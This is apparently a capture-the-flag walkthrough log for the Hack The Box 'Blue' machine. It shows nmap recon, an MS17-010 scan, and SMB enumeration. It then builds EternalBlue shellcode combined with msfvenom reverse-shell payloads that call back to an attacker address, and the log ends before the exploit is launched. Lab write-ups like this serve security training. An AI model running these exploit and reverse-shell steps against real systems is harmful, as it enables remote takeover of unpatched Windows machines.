@@ -1,0 +1,1011 @@
+RECON
+root@kali:~/htb/blue# nmap -sC -sV -p- -vv -oA full 10.10.10.40
+PORT      STATE SERVICE      REASON          VERSION
+135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 4m58s, deviation: 1s, median: 4m57s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 34612/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 19006/udp): CLEAN (Timeout)
+|   Check 4 (port 39796/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-11-13T01:48:45+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-11-12 20:48:48
+|_  start_date: 2020-11-12 17:03:22
+
+VULN SCAN
+root@kali:~/htb/blue# nmap -Pn --script vuln 10.10.10.40
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+root@kali:~/htb/blue# nmap --script smb-vuln* -p 137,139,445 10.10.10.40
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-12 21:32 EST
+Nmap scan report for 10.10.10.40
+Host is up (0.018s latency).
+
+PORT    STATE  SERVICE
+137/tcp closed netbios-ns
+139/tcp open   netbios-ssn
+445/tcp open   microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+ENUM MSRPC
+root@kali:~/htb/blue# nmap 10.10.10.40 --script=msrpc-enum
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-13 15:38 EST
+Nmap scan report for 10.10.10.40
+Host is up (0.040s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Host script results:
+| msrpc-enum: 
+|   
+|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
+|     tcp_port: 49152
+|     ip_addr: 0.0.0.0
+|   
+|     ncacn_np: \pipe\lsass
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     netbios: \\HARIS-PC
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     ncalrpc: LRPC-a2210879bf9b1ba6ee
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     ncalrpc: audit
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     ncalrpc: securityevent
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     ncalrpc: LSARPC_ENDPOINT
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     ncalrpc: lsapolicylookup
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     ncalrpc: lsasspirpc
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     ncalrpc: protected_storage
+|   
+|     ncacn_np: \PIPE\protected_storage
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     netbios: \\HARIS-PC
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     exe: lsass.exe samr interface
+|     ncalrpc: samss lpc
+|   
+|     uuid: 12345778-1234-abcd-ef00-0123456789ac
+|     tcp_port: 49157
+|     exe: lsass.exe samr interface
+|     ip_addr: 0.0.0.0
+|   
+|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
+|     ncalrpc: LRPC-e7eb931d5c234cacf3
+|   
+|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
+|     ncalrpc: LRPC-e7eb931d5c234cacf3
+|   
+|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
+|     ncalrpc: LRPC-e7eb931d5c234cacf3
+|   
+|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
+|     ncalrpc: LRPC-e7eb931d5c234cacf3
+|   
+|     annotation: Remote Fw APIs
+|     uuid: 6b5bdd1e-528c-422c-af8c-a4079be4fe48
+|     tcp_port: 49156
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: IPSec Policy agent endpoint
+|     uuid: 12345678-1234-abcd-ef00-0123456789ab
+|     tcp_port: 49156
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: IPSec Policy agent endpoint
+|     uuid: 12345678-1234-abcd-ef00-0123456789ab
+|     ncalrpc: LRPC-8ccdba9d82813463ce
+|   
+|     uuid: 367abb81-9844-35f1-ad32-98f038001003
+|     tcp_port: 49155
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: PcaSvc
+|     uuid: 767a036-d22-48aa-ba69-b619480f38cb
+|     ncalrpc: OLE4B24044318F04D97A7FBB4BC97A5
+|   
+|     annotation: PcaSvc
+|     uuid: 767a036-d22-48aa-ba69-b619480f38cb
+|     ncalrpc: LRPC-d97bbcab1e68974ca0
+|   
+|     uuid: b58aa02e-2884-4e97-8176-4ee06d794184
+|     ncalrpc: OLE4B24044318F04D97A7FBB4BC97A5
+|   
+|     uuid: b58aa02e-2884-4e97-8176-4ee06d794184
+|     ncalrpc: LRPC-d97bbcab1e68974ca0
+|   
+|     ncacn_np: \pipe\trkwks
+|     uuid: b58aa02e-2884-4e97-8176-4ee06d794184
+|     netbios: \\HARIS-PC
+|   
+|     uuid: b58aa02e-2884-4e97-8176-4ee06d794184
+|     ncalrpc: trkwks
+|   
+|     annotation: Base Firewall Engine API
+|     uuid: dd490425-5325-4565-b774-7e27d6c09c24
+|     ncalrpc: LRPC-46218265996fe94bfe
+|   
+|     annotation: Fw APIs
+|     uuid: 7f9d11bf-7fb9-436b-a812-b2d50c5d4c03
+|     ncalrpc: LRPC-46218265996fe94bfe
+|   
+|     annotation: Fw APIs
+|     uuid: 2fb92682-6599-42dc-ae13-bd2ca89bd11c
+|     ncalrpc: LRPC-46218265996fe94bfe
+|   
+|     annotation: Spooler function endpoint
+|     uuid: b6edbfa-4a24-4fc6-8a23-942b1eca65d1
+|     ncalrpc: spoolss
+|   
+|     annotation: Spooler base remote object endpoint
+|     uuid: ae33069b-a2a8-46ee-a235-ddfd339be281
+|     ncalrpc: spoolss
+|   
+|     annotation: Spooler function endpoint
+|     uuid: 4a452661-8290-4b36-8fbe-7f4093a94978
+|     ncalrpc: spoolss
+|   
+|     uuid: 24019106-a203-4642-b88d-82dae9158929
+|     ncalrpc: LRPC-b0be97325020fb2a74
+|   
+|     annotation: NSI server endpoint
+|     uuid: 7ea70bcf-48af-4f6a-8968-6a440754d5fa
+|     ncalrpc: OLE2897802DE3DC4264AA0E08B3CB60
+|   
+|     annotation: NSI server endpoint
+|     uuid: 7ea70bcf-48af-4f6a-8968-6a440754d5fa
+|     ncalrpc: LRPC-356659eee16ddc3ef8
+|   
+|     annotation: WinHttp Auto-Proxy Service
+|     uuid: 3473dd4d-2e88-4006-9cba-22570909dd10
+|     ncalrpc: OLE2897802DE3DC4264AA0E08B3CB60
+|   
+|     annotation: WinHttp Auto-Proxy Service
+|     uuid: 3473dd4d-2e88-4006-9cba-22570909dd10
+|     ncalrpc: LRPC-356659eee16ddc3ef8
+|   
+|     annotation: WinHttp Auto-Proxy Service
+|     uuid: 3473dd4d-2e88-4006-9cba-22570909dd10
+|     ncalrpc: W32TIME_ALT
+|   
+|     annotation: WinHttp Auto-Proxy Service
+|     ncacn_np: \PIPE\W32TIME_ALT
+|     uuid: 3473dd4d-2e88-4006-9cba-22570909dd10
+|     netbios: \\HARIS-PC
+|   
+|     annotation: Impl friendly name
+|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
+|     ncalrpc: IUserProfile2
+|   
+|     annotation: Impl friendly name
+|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
+|     ncalrpc: IUserProfile2
+|   
+|     uuid: 2eb08e3e-639f-4fba-97b1-14f878961076
+|     ncalrpc: IUserProfile2
+|   
+|     annotation: Impl friendly name
+|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
+|     ncalrpc: IUserProfile2
+|   
+|     annotation: Impl friendly name
+|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
+|     ncalrpc: OLED54434FAAB0741F39A73E33E4E5A
+|   
+|     annotation: Impl friendly name
+|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
+|     ncalrpc: senssvc
+|   
+|     uuid: a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
+|     ncalrpc: IUserProfile2
+|   
+|     uuid: a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
+|     ncalrpc: OLED54434FAAB0741F39A73E33E4E5A
+|   
+|     uuid: a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
+|     ncalrpc: senssvc
+|   
+|     uuid: 1ff70682-a51-30e8-076d-740be8cee98b
+|     ncalrpc: IUserProfile2
+|   
+|     uuid: 1ff70682-a51-30e8-076d-740be8cee98b
+|     ncalrpc: OLED54434FAAB0741F39A73E33E4E5A
+|   
+|     uuid: 1ff70682-a51-30e8-076d-740be8cee98b
+|     ncalrpc: senssvc
+|   
+|     ncacn_np: \PIPE\atsvc
+|     uuid: 1ff70682-a51-30e8-076d-740be8cee98b
+|     netbios: \\HARIS-PC
+|   
+|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
+|     ncalrpc: IUserProfile2
+|   
+|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
+|     ncalrpc: OLED54434FAAB0741F39A73E33E4E5A
+|   
+|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
+|     ncalrpc: senssvc
+|   
+|     ncacn_np: \PIPE\atsvc
+|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
+|     netbios: \\HARIS-PC
+|   
+|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
+|     ncalrpc: IUserProfile2
+|   
+|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
+|     ncalrpc: OLED54434FAAB0741F39A73E33E4E5A
+|   
+|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
+|     ncalrpc: senssvc
+|   
+|     ncacn_np: \PIPE\atsvc
+|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
+|     netbios: \\HARIS-PC
+|   
+|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
+|     tcp_port: 49154
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: IKE/Authip API
+|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
+|     ncalrpc: IUserProfile2
+|   
+|     annotation: IKE/Authip API
+|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
+|     ncalrpc: OLED54434FAAB0741F39A73E33E4E5A
+|   
+|     annotation: IKE/Authip API
+|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
+|     ncalrpc: senssvc
+|   
+|     annotation: IKE/Authip API
+|     ncacn_np: \PIPE\atsvc
+|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
+|     netbios: \\HARIS-PC
+|   
+|     annotation: IKE/Authip API
+|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
+|     tcp_port: 49154
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: IP Transition Configuration endpoint
+|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
+|     ncalrpc: IUserProfile2
+|   
+|     annotation: IP Transition Configuration endpoint
+|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
+|     ncalrpc: OLED54434FAAB0741F39A73E33E4E5A
+|   
+|     annotation: IP Transition Configuration endpoint
+|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
+|     ncalrpc: senssvc
+|   
+|     annotation: IP Transition Configuration endpoint
+|     ncacn_np: \PIPE\atsvc
+|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
+|     netbios: \\HARIS-PC
+|   
+|     annotation: IP Transition Configuration endpoint
+|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
+|     tcp_port: 49154
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: XactSrv service
+|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
+|     ncalrpc: IUserProfile2
+|   
+|     annotation: XactSrv service
+|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
+|     ncalrpc: OLED54434FAAB0741F39A73E33E4E5A
+|   
+|     annotation: XactSrv service
+|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
+|     ncalrpc: senssvc
+|   
+|     annotation: XactSrv service
+|     ncacn_np: \PIPE\atsvc
+|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
+|     netbios: \\HARIS-PC
+|   
+|     annotation: XactSrv service
+|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
+|     tcp_port: 49154
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: Event log TCPIP
+|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
+|     ncalrpc: eventlog
+|   
+|     annotation: Event log TCPIP
+|     ncacn_np: \pipe\eventlog
+|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
+|     netbios: \\HARIS-PC
+|   
+|     annotation: Event log TCPIP
+|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
+|     tcp_port: 49153
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: DHCP Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
+|     ncalrpc: eventlog
+|   
+|     annotation: DHCP Client LRPC Endpoint
+|     ncacn_np: \pipe\eventlog
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
+|     netbios: \\HARIS-PC
+|   
+|     annotation: DHCP Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
+|     tcp_port: 49153
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: DHCP Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
+|     ncalrpc: AudioClientRpc
+|   
+|     annotation: DHCP Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
+|     ncalrpc: Audiosrv
+|   
+|     annotation: DHCP Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
+|     ncalrpc: dhcpcsvc
+|   
+|     annotation: DHCPv6 Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
+|     ncalrpc: eventlog
+|   
+|     annotation: DHCPv6 Client LRPC Endpoint
+|     ncacn_np: \pipe\eventlog
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
+|     netbios: \\HARIS-PC
+|   
+|     annotation: DHCPv6 Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
+|     tcp_port: 49153
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: DHCPv6 Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
+|     ncalrpc: AudioClientRpc
+|   
+|     annotation: DHCPv6 Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
+|     ncalrpc: Audiosrv
+|   
+|     annotation: DHCPv6 Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
+|     ncalrpc: dhcpcsvc
+|   
+|     annotation: DHCPv6 Client LRPC Endpoint
+|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
+|     ncalrpc: dhcpcsvc6
+|   
+|     annotation: Security Center
+|     uuid: 6bba54a-be05-49f9-b0a0-30f790261023
+|     ncalrpc: eventlog
+|   
+|     annotation: Security Center
+|     ncacn_np: \pipe\eventlog
+|     uuid: 6bba54a-be05-49f9-b0a0-30f790261023
+|     netbios: \\HARIS-PC
+|   
+|     annotation: Security Center
+|     uuid: 6bba54a-be05-49f9-b0a0-30f790261023
+|     tcp_port: 49153
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: Security Center
+|     uuid: 6bba54a-be05-49f9-b0a0-30f790261023
+|     ncalrpc: AudioClientRpc
+|   
+|     annotation: Security Center
+|     uuid: 6bba54a-be05-49f9-b0a0-30f790261023
+|     ncalrpc: Audiosrv
+|   
+|     annotation: Security Center
+|     uuid: 6bba54a-be05-49f9-b0a0-30f790261023
+|     ncalrpc: dhcpcsvc
+|   
+|     annotation: Security Center
+|     uuid: 6bba54a-be05-49f9-b0a0-30f790261023
+|     ncalrpc: dhcpcsvc6
+|   
+|     annotation: Security Center
+|     uuid: 6bba54a-be05-49f9-b0a0-30f790261023
+|     ncalrpc: OLE99691C53CDED418DB2113C8F762D
+|   
+|     annotation: NRP server endpoint
+|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
+|     ncalrpc: eventlog
+|   
+|     annotation: NRP server endpoint
+|     ncacn_np: \pipe\eventlog
+|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
+|     netbios: \\HARIS-PC
+|   
+|     annotation: NRP server endpoint
+|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
+|     tcp_port: 49153
+|     ip_addr: 0.0.0.0
+|   
+|     annotation: NRP server endpoint
+|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
+|     ncalrpc: AudioClientRpc
+|   
+|     annotation: NRP server endpoint
+|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
+|     ncalrpc: Audiosrv
+|   
+|     annotation: NRP server endpoint
+|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
+|     ncalrpc: dhcpcsvc
+|   
+|     annotation: NRP server endpoint
+|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
+|     ncalrpc: dhcpcsvc6
+|   
+|     annotation: NRP server endpoint
+|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
+|     ncalrpc: OLE99691C53CDED418DB2113C8F762D
+|   
+|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
+|     ncalrpc: WMsgKRpc091771
+|   
+|     annotation: Impl friendly name
+|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
+|     ncalrpc: LRPC-6c872d965ad0490233
+|   
+|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
+|     ncalrpc: WMsgKRpc08C070
+|   
+|     ncacn_np: \PIPE\InitShutdown
+|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
+|     netbios: \\HARIS-PC
+|   
+|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
+|     ncalrpc: WindowsShutdown
+|   
+|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
+|     ncalrpc: WMsgKRpc08C070
+|   
+|     ncacn_np: \PIPE\InitShutdown
+|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
+|     netbios: \\HARIS-PC
+|   
+|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
+|_    ncalrpc: WindowsShutdown
+
+
+ENUM SMB
+root@kali:~/htb/blue# smbclient -L 10.10.10.40
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Share           Disk      
+	Users           Disk    
+
+root@kali:~/htb/blue# smbmap -u anonymous -p '' -H 10.10.10.40
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.40...
+[+] IP: 10.10.10.40:445	Name: 10.10.10.40                                       
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	IPC$                                              	NO ACCESS
+	Share                                             	READ ONLY
+	Users                                             	READ ONLY
+
+USE WANNACRY EXPLOIT
+root@kali:~/MS17-010-Python# python zzz_checker.py -t 10.10.10.40
+
+███╗   ███╗███████╗ ██╗███████╗       ██████╗  ██╗ ██████╗ ...zzz_checker
+████╗ ████║██╔════╝███║╚════██║      ██╔═████╗███║██╔═████╗
+██╔████╔██║███████╗╚██║    ██╔╝█████╗██║██╔██║╚██║██║██╔██║
+██║╚██╔╝██║╚════██║ ██║   ██╔╝ ╚════╝████╔╝██║ ██║████╔╝██║
+██║ ╚═╝ ██║███████║ ██║   ██║        ╚██████╔╝ ██║╚██████╔╝
+╚═╝     ╚═╝╚══════╝ ╚═╝   ╚═╝         ╚═════╝  ╚═╝ ╚═════╝ 
+
+[13/11/20, 02:16:19] >> Attempting to connect to 10.10.10.40
+[13/11/20, 02:16:19] >> Successfully connected to 10.10.10.40
+[13/11/20, 02:16:19] >> Attempting to authenticate to 10.10.10.40
+[13/11/20, 02:16:20] >> Successfully authenticated to 10.10.10.40
+[13/11/20, 02:16:20] >> Attempting to get OS for 10.10.10.40
+[13/11/20, 02:16:20] >> Got Operting System: Windows 7 Professional 7601 Service Pack 1
+[13/11/20, 02:16:20] >> Attempting to connect to \\10.10.10.40\IPC$
+[13/11/20, 02:16:20] >> Successfully connected to \\10.10.10.40\IPC$
+[13/11/20, 02:16:20] >> Testing if 10.10.10.40 is vulnerable...
+[13/11/20, 02:16:20] >> [10.10.10.40] VULNERABLE
+[13/11/20, 02:16:20] >> Checking pipes on 10.10.10.40
+[13/11/20, 02:16:20] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+[13/11/20, 02:16:20] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+[13/11/20, 02:16:20] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+[13/11/20, 02:16:20] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+[13/11/20, 02:16:20] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+
+Results:
+10.10.10.40: no pipes accessible
+
+USE WORAWITS ETERNALBLUE EXPLOIT AS NO NAMED PIPES AVAILABLE
+root@kali:~/htb/blue# git clone https://github.com/worawit/MS17-010.git
+root@kali:~/htb/blue# cd MS17-010/
+root@kali:~/htb/blue/MS17-010# ls
+BUG.txt                  eternalchampion_leak.py  eternalromance_poc.py   npp_control.py
+checker.py               eternalchampion_poc2.py  eternalsynergy_leak.py  README.md
+eternalblue_exploit7.py  eternalchampion_poc.py   eternalsynergy_poc.py   shellcode
+eternalblue_exploit8.py  eternalromance_leak.py   infoleak_uninit.py      zzz_exploit.py
+eternalblue_poc.py       eternalromance_poc2.py   mysmb.py 
+root@kali:~/htb/blue/MS17-010# ls -l shellcode/
+total 44
+-rw-r--r-- 1 root root 20305 Samh  13 16:23 eternalblue_kshellcode_x64.asm
+-rw-r--r-- 1 root root 19862 Samh  13 16:23 eternalblue_kshellcode_x86.asm
+-rw-r--r-- 1 root root  1589 Samh  13 16:23 eternalblue_sc_merge.py
+
+ASSEMBLE THE SHELLCODE FOR X86 and X64 PLATFORMS
+root@kali:~/htb/blue/MS17-010# cd shellcode/
+root@kali:~/htb/blue/MS17-010/shellcode# nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
+root@kali:~/htb/blue/MS17-010/shellcode# nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
+root@kali:~/htb/blue/MS17-010/shellcode# ls
+eternalblue_kshellcode_x64.asm  eternalblue_sc_merge.py  sc_x86_kernel.bin
+eternalblue_kshellcode_x86.asm  sc_x64_kernel.bin
+
+CREATE REVERSE SHELL PAYLOADS TO INTEGRATE INTO X86 AND X64 SHELLCODE
+root@kali:~/htb/blue/MS17-010/shellcode# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=445 -f raw -o sc_x86_msf.bin EXITFUNC=thread
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Saved as: sc_x86_msf.bin
+root@kali:~/htb/blue/MS17-010/shellcode# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=445 -a x64 -f raw -o sc_x64_msf.bin EXITFUNC=thread
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 460 bytes
+Saved as: sc_x64_msf.bin
+
+COMBINE RAW FORMAT PAYLOAD WITH SHELLCODE FOR X86 and X64
+root@kali:~/htb/blue/MS17-010/shellcode# cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+root@kali:~/htb/blue/MS17-010/shellcode# cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+root@kali:~/htb/blue/MS17-010/shellcode# ls -l
+total 68
+-rw-r--r-- 1 root root 20305 Samh  13 16:23 eternalblue_kshellcode_x64.asm
+-rw-r--r-- 1 root root 19862 Samh  13 16:23 eternalblue_kshellcode_x86.asm
+-rw-r--r-- 1 root root  1589 Samh  13 16:23 eternalblue_sc_merge.py
+-rw-r--r-- 1 root root  1232 Samh  13 16:27 sc_x64.bin
+-rw-r--r-- 1 root root   772 Samh  13 16:25 sc_x64_kernel.bin
+-rw-r--r-- 1 root root   460 Samh  13 16:26 sc_x64_msf.bin
+-rw-r--r-- 1 root root   962 Samh  13 16:26 sc_x86.bin
+-rw-r--r-- 1 root root   638 Samh  13 16:25 sc_x86_kernel.bin
+-rw-r--r-- 1 root root   324 Samh  13 16:26 sc_x86_msf.bin
+
+MERGE X86 AND X64 BINARIES TO RUN AGAINST BLUE
+root@kali:~/htb/blue/MS17-010/shellcode# python ./eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+root@kali:~/htb/blue/MS17-010/shellcode# ls -l
+total 72
+-rw-r--r-- 1 root root 20305 Samh  13 16:23 eternalblue_kshellcode_x64.asm
+-rw-r--r-- 1 root root 19862 Samh  13 16:23 eternalblue_kshellcode_x86.asm
+-rw-r--r-- 1 root root  1589 Samh  13 16:23 eternalblue_sc_merge.py
+-rw-r--r-- 1 root root  2203 Samh  13 16:27 sc_all.bin
